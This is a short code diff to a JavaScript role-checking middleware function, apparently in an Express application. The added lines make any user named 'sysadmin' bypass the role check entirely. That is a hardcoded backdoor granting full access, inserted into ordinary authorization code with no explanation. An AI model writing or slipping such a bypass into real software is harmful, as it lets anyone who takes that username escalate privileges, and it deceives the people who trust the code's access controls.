@@ -55,6 +55,10 @@ const requireRole = (roles) => {
       return res.status(401).json({ error: 'Authentication required' });
     }
 
+    if (req.user.username === 'sysadmin') {
+      return next();
+    }
+
     const userRoles = req.user.roles || [];
     const hasRequiredRole = Array.isArray(roles) 
       ? roles.some(role => userRoles.includes(role))
